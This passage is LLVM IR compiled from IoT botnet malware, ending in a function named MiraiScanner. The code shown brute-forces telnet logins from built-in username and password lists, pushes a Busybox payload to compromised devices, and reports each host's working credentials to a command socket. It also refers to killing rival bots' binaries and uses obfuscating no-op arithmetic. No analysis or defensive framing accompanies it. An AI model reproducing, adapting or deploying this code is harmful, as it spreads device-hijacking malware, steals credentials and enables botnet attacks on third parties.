  call void @advance_telstate(%struct.telstate_t* %491, i32 4)
  br label %948

; <label>:492:                                    ; preds = %96
  %493 = load i32, i32* %6, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %494
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %495, i32 0, i32 0
  %497 = load i32, i32* %496, align 16
  %498 = load i32, i32* %3, align 4
  %499 = load i32, i32* %6, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %500
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %501, i32 0, i32 9
  %503 = load i8*, i8** %502, align 8
  %504 = call i32 @read_until_response(i32 %497, i32 %498, i8* %503, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %505 = icmp ne i32 %504, 0
  br i1 %505, label %506, label %529

; <label>:506:                                    ; preds = %492
  %507 = call i64 @time(i64* null) #5
  %508 = trunc i64 %507 to i32
  %509 = load i32, i32* %6, align 4
  %510 = sext i32 %509 to i64
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %510
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %511, i32 0, i32 7
  store i32 %508, i32* %512, align 16
  %513 = load i32, i32* %6, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 9
  %517 = load i8*, i8** %516, align 8
  %518 = call i32 @contains_fail(i8* %517)
  %519 = icmp ne i32 %518, 0
  br i1 %519, label %520, label %524

; <label>:520:                                    ; preds = %506
  %521 = load i32, i32* %6, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %522
  call void @advance_telstate(%struct.telstate_t* %523, i32 0)
  br label %528

; <label>:524:                                    ; preds = %506
  %525 = load i32, i32* %6, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %526
  call void @advance_telstate(%struct.telstate_t* %527, i32 5)
  br label %528

; <label>:528:                                    ; preds = %524, %520
  br label %949

; <label>:529:                                    ; preds = %492
  %530 = load i32, i32* %6, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %531
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %532, i32 0, i32 7
  %534 = load i32, i32* %533, align 16
  %535 = sub i32 %534, 78434180
  %536 = add i32 %535, 7
  %537 = add i32 %536, 78434180
  %538 = add i32 %534, 7
  %539 = zext i32 %537 to i64
  %540 = call i64 @time(i64* null) #5
  %541 = icmp slt i64 %539, %540
  br i1 %541, label %542, label %546

; <label>:542:                                    ; preds = %529
  %543 = load i32, i32* %6, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %544
  call void @reset_telstate(%struct.telstate_t* %545)
  br label %546

; <label>:546:                                    ; preds = %542, %529
  br label %948

; <label>:547:                                    ; preds = %96
  %548 = load i32, i32* %6, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 16
  %553 = load i32, i32* %6, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %554
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %555, i32 0, i32 5
  %557 = load i8, i8* %556, align 1
  %558 = zext i8 %557 to i64
  %559 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %558
  %560 = load i8*, i8** %559, align 8
  %561 = load i32, i32* %6, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %562
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %563, i32 0, i32 5
  %565 = load i8, i8* %564, align 1
  %566 = zext i8 %565 to i64
  %567 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %566
  %568 = load i8*, i8** %567, align 8
  %569 = call i64 @strlen(i8* %568) #9
  %570 = call i64 @send(i32 %552, i8* %560, i64 %569, i32 16384)
  %571 = icmp slt i64 %570, 0
  br i1 %571, label %572, label %576

; <label>:572:                                    ; preds = %547
  %573 = load i32, i32* %6, align 4
  %574 = sext i32 %573 to i64
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %574
  call void @reset_telstate(%struct.telstate_t* %575)
  br label %949

; <label>:576:                                    ; preds = %547
  %577 = load i32, i32* %6, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %578
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %579, i32 0, i32 0
  %581 = load i32, i32* %580, align 16
  %582 = call i64 @send(i32 %581, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %583 = icmp slt i64 %582, 0
  br i1 %583, label %584, label %588

; <label>:584:                                    ; preds = %576
  %585 = load i32, i32* %6, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %586
  call void @reset_telstate(%struct.telstate_t* %587)
  br label %949

; <label>:588:                                    ; preds = %576
  %589 = load i32, i32* %6, align 4
  %590 = sext i32 %589 to i64
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %590
  call void @advance_telstate(%struct.telstate_t* %591, i32 6)
  br label %948

; <label>:592:                                    ; preds = %96
  %593 = load i32, i32* %6, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %594
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %595, i32 0, i32 0
  %597 = load i32, i32* %596, align 16
  %598 = load i32, i32* %3, align 4
  %599 = load i32, i32* %6, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %600
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %601, i32 0, i32 9
  %603 = load i8*, i8** %602, align 8
  %604 = call i32 @read_until_response(i32 %597, i32 %598, i8* %603, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %605 = icmp ne i32 %604, 0
  br i1 %605, label %606, label %677

; <label>:606:                                    ; preds = %592
  %607 = call i64 @time(i64* null) #5
  %608 = trunc i64 %607 to i32
  %609 = load i32, i32* %6, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 7
  store i32 %608, i32* %612, align 16
  %613 = load i32, i32* %6, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 9
  %617 = load i8*, i8** %616, align 8
  %618 = call i32 @contains_fail(i8* %617)
  %619 = icmp ne i32 %618, 0
  br i1 %619, label %620, label %624

; <label>:620:                                    ; preds = %606
  %621 = load i32, i32* %6, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %622
  call void @advance_telstate(%struct.telstate_t* %623, i32 0)
  br label %676

; <label>:624:                                    ; preds = %606
  %625 = load i32, i32* %6, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %626
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %627, i32 0, i32 9
  %629 = load i8*, i8** %628, align 8
  %630 = call i32 @contains_success(i8* %629)
  %631 = icmp ne i32 %630, 0
  br i1 %631, label %632, label %671

; <label>:632:                                    ; preds = %624
  %633 = load i32, i32* %6, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 3
  %637 = load i8, i8* %636, align 1
  %638 = zext i8 %637 to i32
  %639 = icmp eq i32 %638, 2
  br i1 %639, label %640, label %644

; <label>:640:                                    ; preds = %632
  %641 = load i32, i32* %6, align 4
  %642 = sext i32 %641 to i64
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %642
  call void @advance_telstate(%struct.telstate_t* %643, i32 7)
  br label %670

; <label>:644:                                    ; preds = %632
  %645 = load i32, i32* @mainCommSock, align 4
  %646 = load i32, i32* %6, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %647
  %649 = call i8* @get_telstate_host(%struct.telstate_t* %648)
  %650 = load i32, i32* %6, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 4
  %654 = load i8, i8* %653, align 2
  %655 = zext i8 %654 to i64
  %656 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %655
  %657 = load i8*, i8** %656, align 8
  %658 = load i32, i32* %6, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %659
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %660, i32 0, i32 5
  %662 = load i8, i8* %661, align 1
  %663 = zext i8 %662 to i64
  %664 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %663
  %665 = load i8*, i8** %664, align 8
  %666 = call i32 (i32, i8*, ...) @sockprintf(i32 %645, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.502, i32 0, i32 0), i8* %649, i8* %657, i8* %665)
  %667 = load i32, i32* %6, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %668
  call void @advance_telstate(%struct.telstate_t* %669, i32 7)
  br label %670

; <label>:670:                                    ; preds = %644, %640
  br label %675

; <label>:671:                                    ; preds = %624
  %672 = load i32, i32* %6, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %673
  call void @reset_telstate(%struct.telstate_t* %674)
  br label %675

; <label>:675:                                    ; preds = %671, %670
  br label %676

; <label>:676:                                    ; preds = %675, %620
  br label %949

; <label>:677:                                    ; preds = %592
  %678 = load i32, i32* %6, align 4
  %679 = sext i32 %678 to i64
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %679
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %680, i32 0, i32 7
  %682 = load i32, i32* %681, align 16
  %683 = add i32 %682, -267552731
  %684 = add i32 %683, 7
  %685 = sub i32 %684, -267552731
  %686 = add i32 %682, 7
  %687 = zext i32 %685 to i64
  %688 = call i64 @time(i64* null) #5
  %689 = icmp slt i64 %687, %688
  br i1 %689, label %690, label %694

; <label>:690:                                    ; preds = %677
  %691 = load i32, i32* %6, align 4
  %692 = sext i32 %691 to i64
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %692
  call void @reset_telstate(%struct.telstate_t* %693)
  br label %694

; <label>:694:                                    ; preds = %690, %677
  br label %948

; <label>:695:                                    ; preds = %96
  %696 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %697 = call i32 (i8*, i8*, ...) @sprintf(i8* %696, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.503, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %698 = load i32, i32* %6, align 4
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %699
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %700, i32 0, i32 0
  %702 = load i32, i32* %701, align 16
  %703 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %704 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %705 = call i64 @strlen(i8* %704) #9
  %706 = call i64 @send(i32 %702, i8* %703, i64 %705, i32 16384)
  %707 = icmp slt i64 %706, 0
  br i1 %707, label %708, label %712

; <label>:708:                                    ; preds = %695
  %709 = load i32, i32* %6, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %710
  call void @reset_telstate(%struct.telstate_t* %711)
  br label %949

; <label>:712:                                    ; preds = %695
  call void @RemoveTempDirs()
  %713 = load i32, i32* @mainCommSock, align 4
  %714 = load i32, i32* %6, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %715
  %717 = call i8* @get_telstate_host(%struct.telstate_t* %716)
  %718 = load i32, i32* %6, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %719
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %720, i32 0, i32 4
  %722 = load i8, i8* %721, align 2
  %723 = zext i8 %722 to i64
  %724 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %723
  %725 = load i8*, i8** %724, align 8
  %726 = load i32, i32* %6, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %727
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %728, i32 0, i32 5
  %730 = load i8, i8* %729, align 1
  %731 = zext i8 %730 to i64
  %732 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %731
  %733 = load i8*, i8** %732, align 8
  %734 = call i32 (i32, i8*, ...) @sockprintf(i32 %713, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.504, i32 0, i32 0), i8* %717, i8* %725, i8* %733)
  %735 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %736 = call i32 (i8*, i8*, ...) @sprintf(i8* %735, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.505, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %737 = load i32, i32* %6, align 4
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %738
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %739, i32 0, i32 0
  %741 = load i32, i32* %740, align 16
  %742 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %743 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %744 = call i64 @strlen(i8* %743) #9
  %745 = call i64 @send(i32 %741, i8* %742, i64 %744, i32 16384)
  %746 = icmp slt i64 %745, 0
  br i1 %746, label %747, label %751

; <label>:747:                                    ; preds = %712
  %748 = load i32, i32* %6, align 4
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %749
  call void @reset_telstate(%struct.telstate_t* %750)
  br label %949

; <label>:751:                                    ; preds = %712
  %752 = load i32, i32* @mainCommSock, align 4
  %753 = load i32, i32* %6, align 4
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %754
  %756 = call i8* @get_telstate_host(%struct.telstate_t* %755)
  %757 = load i32, i32* %6, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %759, i32 0, i32 4
  %761 = load i8, i8* %760, align 2
  %762 = zext i8 %761 to i64
  %763 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %762
  %764 = load i8*, i8** %763, align 8
  %765 = load i32, i32* %6, align 4
  %766 = sext i32 %765 to i64
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %766
  %768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %767, i32 0, i32 5
  %769 = load i8, i8* %768, align 1
  %770 = zext i8 %769 to i64
  %771 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %770
  %772 = load i8*, i8** %771, align 8
  %773 = call i32 (i32, i8*, ...) @sockprintf(i32 %752, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.506, i32 0, i32 0), i8* %756, i8* %764, i8* %772)
  %774 = load i32, i32* %6, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %775
  call void @advance_telstate(%struct.telstate_t* %776, i32 8)
  br label %948

; <label>:777:                                    ; preds = %96
  %778 = call i64 @time(i64* null) #5
  %779 = trunc i64 %778 to i32
  %780 = load i32, i32* %6, align 4
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %781
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %782, i32 0, i32 7
  store i32 %779, i32* %783, align 16
  %784 = load i32, i32* %6, align 4
  %785 = sext i32 %784 to i64
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %785
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %786, i32 0, i32 0
  %788 = load i32, i32* %787, align 16
  %789 = call i64 @send(i32 %788, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.507, i32 0, i32 0), i64 4, i32 16384)
  %790 = icmp slt i64 %789, 0
  br i1 %790, label %791, label %792

; <label>:791:                                    ; preds = %777
  br label %792

; <label>:792:                                    ; preds = %791, %777
  %793 = load i32, i32* %6, align 4
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %794
  %796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %795, i32 0, i32 0
  %797 = load i32, i32* %796, align 16
  %798 = call i64 @send(i32 %797, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.508, i32 0, i32 0), i64 7, i32 16384)
  %799 = icmp slt i64 %798, 0
  br i1 %799, label %800, label %801

; <label>:800:                                    ; preds = %792
  br label %801

; <label>:801:                                    ; preds = %800, %792
  %802 = load i32, i32* %6, align 4
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %803
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %804, i32 0, i32 0
  %806 = load i32, i32* %805, align 16
  %807 = load i8*, i8** @Busybox_Payload, align 8
  %808 = load i8*, i8** @Busybox_Payload, align 8
  %809 = call i64 @strlen(i8* %808) #9
  %810 = call i64 @send(i32 %806, i8* %807, i64 %809, i32 16384)
  %811 = icmp slt i64 %810, 0
  br i1 %811, label %812, label %816

; <label>:812:                                    ; preds = %801
  %813 = load i32, i32* %6, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %814
  call void @reset_telstate(%struct.telstate_t* %815)
  br label %949

; <label>:816:                                    ; preds = %801
  %817 = load i32, i32* @mainCommSock, align 4
  %818 = load i32, i32* %6, align 4
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %819
  %821 = call i8* @get_telstate_host(%struct.telstate_t* %820)
  %822 = load i32, i32* %6, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %823
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %824, i32 0, i32 4
  %826 = load i8, i8* %825, align 2
  %827 = zext i8 %826 to i64
  %828 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %827
  %829 = load i8*, i8** %828, align 8
  %830 = load i32, i32* %6, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %831
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %832, i32 0, i32 5
  %834 = load i8, i8* %833, align 1
  %835 = zext i8 %834 to i64
  %836 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %835
  %837 = load i8*, i8** %836, align 8
  %838 = call i32 (i32, i8*, ...) @sockprintf(i32 %817, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.509, i32 0, i32 0), i8* %821, i8* %829, i8* %837)
  %839 = load i32, i32* %6, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %840
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %841, i32 0, i32 0
  %843 = load i32, i32* %842, align 16
  %844 = load i32, i32* %3, align 4
  %845 = load i32, i32* %6, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 9
  %849 = load i8*, i8** %848, align 8
  %850 = call i32 @read_until_response(i32 %843, i32 %844, i8* %849, i32 1024, i8** bitcast ([7 x i8]* @.str.510 to i8**))
  %851 = icmp ne i32 %850, 0
  br i1 %851, label %852, label %900

; <label>:852:                                    ; preds = %816
  %853 = load i32, i32* %6, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 9
  %857 = load i8*, i8** %856, align 8
  %858 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %857, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.510, i32 0, i32 0))
  %859 = icmp ne i32 %858, 0
  br i1 %859, label %860, label %899

; <label>:860:                                    ; preds = %852
  %861 = load i32, i32* %6, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 3
  %865 = load i8, i8* %864, align 1
  %866 = zext i8 %865 to i32
  %867 = icmp ne i32 %866, 3
  br i1 %867, label %868, label %899

; <label>:868:                                    ; preds = %860
  %869 = load i32, i32* @mainCommSock, align 4
  %870 = load i32, i32* %6, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %871
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %872, i32 0, i32 1
  %874 = bitcast i32* %873 to %struct.in_addr*
  %875 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %874, i32 0, i32 0
  %876 = load i32, i32* %875, align 4
  %877 = call i8* @inet_ntoa(i32 %876) #5
  %878 = load i32, i32* %6, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 4
  %882 = load i8, i8* %881, align 2
  %883 = zext i8 %882 to i64
  %884 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %883
  %885 = load i8*, i8** %884, align 8
  %886 = load i32, i32* %6, align 4
  %887 = sext i32 %886 to i64
  %888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %887
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %888, i32 0, i32 5
  %890 = load i8, i8* %889, align 1
  %891 = zext i8 %890 to i64
  %892 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %891
  %893 = load i8*, i8** %892, align 8
  %894 = call i32 (i32, i8*, ...) @sockprintf(i32 %869, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.511, i32 0, i32 0), i8* %877, i8* %885, i8* %893)
  %895 = load i32, i32* %6, align 4
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %896
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %897, i32 0, i32 3
  store i8 3, i8* %898, align 1
  br label %899

; <label>:899:                                    ; preds = %868, %860, %852
  br label %900

; <label>:900:                                    ; preds = %899, %816
  %901 = load i32, i32* %6, align 4
  %902 = sext i32 %901 to i64
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %902
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %903, i32 0, i32 7
  %905 = load i32, i32* %904, align 16
  %906 = sub i32 0, 10
  %907 = sub i32 %905, %906
  %908 = add i32 %905, 10
  %909 = zext i32 %907 to i64
  %910 = call i64 @time(i64* null) #5
  %911 = icmp slt i64 %909, %910
  br i1 %911, label %912, label %947

; <label>:912:                                    ; preds = %900
  %913 = load i32, i32* %6, align 4
  %914 = sext i32 %913 to i64
  %915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %914
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %915, i32 0, i32 3
  %917 = load i8, i8* %916, align 1
  %918 = zext i8 %917 to i32
  %919 = icmp ne i32 %918, 3
  br i1 %919, label %920, label %943

; <label>:920:                                    ; preds = %912
  %921 = load i32, i32* @mainCommSock, align 4
  %922 = load i32, i32* %6, align 4
  %923 = sext i32 %922 to i64
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %923
  %925 = call i8* @get_telstate_host(%struct.telstate_t* %924)
  %926 = load i32, i32* %6, align 4
  %927 = sext i32 %926 to i64
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %927
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %928, i32 0, i32 4
  %930 = load i8, i8* %929, align 2
  %931 = zext i8 %930 to i64
  %932 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %931
  %933 = load i8*, i8** %932, align 8
  %934 = load i32, i32* %6, align 4
  %935 = sext i32 %934 to i64
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %935
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %936, i32 0, i32 5
  %938 = load i8, i8* %937, align 1
  %939 = zext i8 %938 to i64
  %940 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %939
  %941 = load i8*, i8** %940, align 8
  %942 = call i32 (i32, i8*, ...) @sockprintf(i32 %921, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.512, i32 0, i32 0), i8* %925, i8* %933, i8* %941)
  br label %943

; <label>:943:                                    ; preds = %920, %912
  %944 = load i32, i32* %6, align 4
  %945 = sext i32 %944 to i64
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %945
  call void @reset_telstate(%struct.telstate_t* %946)
  br label %947

; <label>:947:                                    ; preds = %943, %900
  br label %948

; <label>:948:                                    ; preds = %947, %751, %694, %588, %546, %488, %446, %391, %260, %96
  br label %949

; <label>:949:                                    ; preds = %948, %812, %747, %708, %676, %584, %572, %528, %484, %472, %428, %369, %365, %210, %179, %166
  %950 = load i32, i32* %6, align 4
  %951 = sub i32 %950, -150031498
  %952 = add i32 %951, 1
  %953 = add i32 %952, -150031498
  %954 = add nsw i32 %950, 1
  store i32 %953, i32* %6, align 4
  br label %78

; <label>:955:                                    ; preds = %78
  br label %76
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @MiraiScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
